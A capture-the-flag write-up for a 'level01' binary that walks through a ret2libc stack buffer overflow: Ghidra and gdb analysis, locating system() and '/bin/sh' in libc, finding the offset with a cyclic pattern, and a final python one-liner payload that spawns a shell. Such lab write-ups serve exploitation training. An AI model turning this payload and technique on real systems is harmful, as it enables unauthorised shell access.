
When we analyze the program, we see that the valid username parameter is “dat_wil”. We saw this through Ghidra, but if you prefer, you can see it using a simple solution like gdb or **strings ./level01**.

When we ran the program and checked, we saw that the username was correct. When we looked at the password through Ghidra, we saw that it was **admin**, but we received an incorrect password warning. We then continued to analyze the main.

```
    if ((local_14 == 0) || (local_14 != 0)) {
      puts("nope, incorrect password...\n");
      uVar1 = 1;
    }
```

No matter what password we entered, we would have seen the “incorrect password” message here anyway

```
    puts("Enter Password: ");
    fgets(local_54,100,stdin);
```

It takes a 100-byte value for the password, but our password variable is 64 bytes. We will use a buffer overflow here.


```diff
+(gdb) b main
Breakpoint 1 at 0x80484d5
+(gdb) r
Starting program: /home/users/level01/level01

Breakpoint 1, 0x080484d5 in main ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

```diff
+(gdb) info proc map
process 2683
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
         0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
         0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
        0xf7e2b000 0xf7e2c000     0x1000        0x0
+        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fda000 0xf7fdb000     0x1000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+(gdb) find 0xf7e2c000,0xf7fd0000 , "/bin/sh"
+0xf7f897ec
1 pattern found.
```

```
system = 0xf7e6aed0
/bin/sh = 0xf7f897ec
```

```diff
+(gdb) b main
Breakpoint 1 at 0x80484d5
+(gdb) r
Starting program: /home/users/level01/level01

Breakpoint 1, 0x080484d5 in main ()
+(gdb) continue
Continuing.
********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
verifying username....

Enter Password:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
```

>[!TIP]
> Best website for pattern generate and offset find. :)
> 
>https://lujiangz.github.io/tools/pattern/index.html



```
(python -c 'print ("dat_wil\n" + "A" * 80 + ("\xd0\xae\xe6\xf7") + "aaaa" + ("\xec\x97\xf8\xf7"))';cat) | ./level01
```